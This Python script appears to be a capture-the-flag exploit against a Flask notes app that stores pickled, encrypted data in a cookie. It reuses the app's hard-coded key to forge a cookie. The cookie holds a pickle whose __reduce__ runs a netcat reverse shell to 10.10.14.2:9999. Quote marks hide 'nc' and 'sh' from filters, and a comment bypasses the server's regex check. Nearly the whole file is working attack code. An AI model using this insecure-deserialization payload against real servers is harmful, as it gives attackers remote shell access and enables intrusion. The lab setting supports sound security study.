import pickle
import base64
import os
import base64
import hashlib
import re
from datetime import datetime

from cryptography.fernet import Fernet
from flask import Flask, flash, redirect, render_template, request, url_for

app = Flask(__name__)
app.config['SECRET_KEY'] = '@s3cur3P!ck13K3y'


class encryptAES:
    def __init__(self, data):
        self.data = data
        self.key = base64.b64encode(hashlib.sha256(
            app.config['SECRET_KEY'].encode()).digest()[:32])
        self.f = Fernet(self.key)

    def encrypt(self):
        encrypted = self.f.encrypt(self.data)
        return base64.b64encode(encrypted).decode()

    def decrypt(self):
        encrypted = base64.b64decode(self.data)
        return self.f.decrypt(encrypted)


class RCE:
    def __reduce__(self):
        return os.system, ("n''c -nv 10.10.14.2 9999 -e /bin/s''h # Title.*?Text.*?Date",)
    
    
def serialize(dictionary):
    serialized = pickle.dumps(dictionary)
    serialized = encryptAES(serialized).encrypt()
    return serialized


def deserialize(serialized):
    try:
        serialized = encryptAES(serialized).decrypt()
        print(serialized)
    except:
        raise Exception('Invalid session!')
    if not re.search('Title.*?Text.*?Date', str(serialized)):
        raise Exception('Invalid session!')
    dictionary = pickle.loads(serialized)
    if [*dictionary] != ['Title', 'Text', 'Date']:
        raise Exception('Invalid session!')
    return dictionary


def saveNote():
    dictionary = {'Title': '', 'Text': '',
                  'Date': datetime.now().strftime('%I:%M %p, %d %b %Y')}

    dictionary['Title'] = ""
    dictionary['Text'] = ""
    serialized = serialize(dictionary)
    resp = redirect(url_for('index'))
    resp.set_cookie('notes', serialized)
    return resp



r = RCE()
p = pickle.dumps(r)
b = encryptAES(p).encrypt()
print(str(b))
# print(deserialize(b))
# b = base64.b64encode(p)
# print(b.decode())

# dictionary = deserialize("Z0FBQUFBQm5TU29rNGlIMDhTcGdYR3BjMkNaSlJvWkxSZXVpc09TX1VVRWpQNGFnU2NEYXlVQ2hSZGdYOXZVZzlQWThmU3dOQ2ltZnNtSjAyaHVkcEJja2h4Uzk5V3dGV2JzcUJTajVfOHN4UlVMZXMwaVpSSE5MNUJzanpGcGhoVmtLLVc0T1poRnZqdHJpVF9MaHUtYTBDX1h5Wl9DWVhyME9xbDBEREk4WTF3TkNPcGFOaW44LVJHNFZHQnpyeHROdDc1eUpwb3Zz")
# print(dictionary)